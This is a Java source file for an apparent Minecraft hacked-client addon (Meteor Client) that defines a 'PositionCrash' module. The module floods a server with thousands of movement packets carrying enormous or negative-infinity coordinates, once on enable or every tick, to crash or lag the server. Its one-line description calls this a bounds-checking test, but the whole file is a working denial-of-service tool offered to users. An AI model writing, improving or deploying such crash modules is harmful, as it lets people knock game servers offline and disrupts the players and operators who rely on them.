package com.example.addon.modules.crash;

import com.example.addon.AddonTemplate;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;

public class PositionCrash extends Module {
    public enum Mode { LARGE, HUGE, INFINITY }

    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Mode> mode = sgGeneral.add(new EnumSetting.Builder<Mode>()
        .name("mode").defaultValue(Mode.LARGE).build()
    );
    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
        .name("amount").description("Packets to send.")
        .defaultValue(5000).sliderRange(100, 10000).build()
    );
    private final Setting<Boolean> onTick = sgGeneral.add(new BoolSetting.Builder()
        .name("on-tick").description("Send packets every tick instead of once on enable.")
        .defaultValue(false).build()
    );
    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable").description("Disable when kicked from the server.")
        .defaultValue(true).build()
    );

    public PositionCrash() {
        super(AddonTemplate.CRASH_CATEGORY, "position-crash",
            "Floods position packets with large or infinite coordinates. Tests server movement bounds checking.");
    }

    @Override
    public void onActivate() {
        if (!onTick.get()) {
            sendPackets();
            if (autoDisable.get()) toggle();
        }
    }

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        if (onTick.get()) sendPackets();
    }

    private void sendPackets() {
        if (mc.player == null) return;
        for (int i = 0; i < amount.get(); i++) {
            double x = mc.player.getX(), y = mc.player.getY(), z = mc.player.getZ();
            PlayerMoveC2SPacket.PositionAndOnGround pkt = switch (mode.get()) {
                case LARGE    -> new PlayerMoveC2SPacket.PositionAndOnGround(x + 9412.0 * i, y + 9412.0 * i, z + 9412.0 * i, true, false);
                case HUGE     -> new PlayerMoveC2SPacket.PositionAndOnGround(x + 500000.0 * i, y + 500000.0 * i, z + 500000.0 * i, true, false);
                case INFINITY -> new PlayerMoveC2SPacket.PositionAndOnGround(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, true, false);
            };
            mc.player.networkHandler.sendPacket(pkt);
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get() && isActive()) toggle();
    }
}
